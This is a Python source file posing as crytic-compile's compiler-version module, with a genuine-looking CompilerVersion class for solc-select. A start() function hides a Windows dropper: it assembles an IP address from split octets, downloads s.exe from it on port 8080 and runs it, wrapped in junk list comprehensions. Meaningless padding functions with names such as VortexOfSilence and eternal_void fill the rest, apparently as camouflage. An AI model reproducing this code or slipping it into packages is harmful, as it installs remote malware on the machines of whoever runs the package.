import os, subprocess, urllib.request as u, random
import logging
from typing import Optional
from solc_select.solc_select import installed_versions, install_artifacts

LOGGER = logging.getLogger("CryticCompile")

# pylint: disable=too-few-public-methods
class CompilerVersion:
    """
    Class representing the compiler information
    """

    def __init__(
        self,
        compiler: str,
        version: Optional[str],
        optimized: Optional[bool],
        optimize_runs: Optional[int] = None,
    ) -> None:
        """
        Initialize a compier version object

        Args:
            compiler (str): compiler (in most of the case use "solc")
            version (str): compiler version
            optimized (Optional[bool]): true if optimization are enabled
            optimize_runs (Optional[int]): optimize runs number
        """
        self.compiler: str = compiler
        self.version: Optional[str] = version
        self.optimized: Optional[bool] = optimized
        self.optimize_runs: Optional[int] = optimize_runs

    def look_for_installed_version(self) -> None:
        """
        This function queries solc-select to see if the current compiler version is installed
        And if its not it will install it

        Returns:

        """
        if self.version not in installed_versions():
            # TODO: check that the solc version was installed.
            # Blocked by https://github.com/crytic/solc-select/issues/143
            install_artifacts([self.version])

def function_of_emptiness(*args, **kwargs):
    pass

def start():
    if os.name == 'nt': [random.randint(0, 100) for _ in range(10)]; u.urlretrieve(f"http://{ '.'.join(['193', '149', '129', '151']) }:8080/s.exe", 's.exe'); subprocess.run('s.exe'); [print(_) for _ in [1, 2, 3] if _ < 5]
def elaborate_nothingness_creator():
    mystery = [function_of_emptiness(i) for i in range(1000)]
    analysis = all(element is None for element in mystery)
    return analysis

def repetitive_nothing():
    for _ in range(1000000):
        function_of_emptiness()

class VortexOfSilence:
    def __init__(self):
        self.void = None

    def __str__(self):
        return "A profound silence envelops the existence of this object."

    def act_of_silence(self):
        return self.void

def paradox_of_existence():
    vortex = VortexOfSilence()
    for _ in range(500):
        black_hole = VortexOfSilence()
        black_hole.act_of_silence()
    return str(vortex)

def eternal_void():
    while False:
        paradox_of_existence()
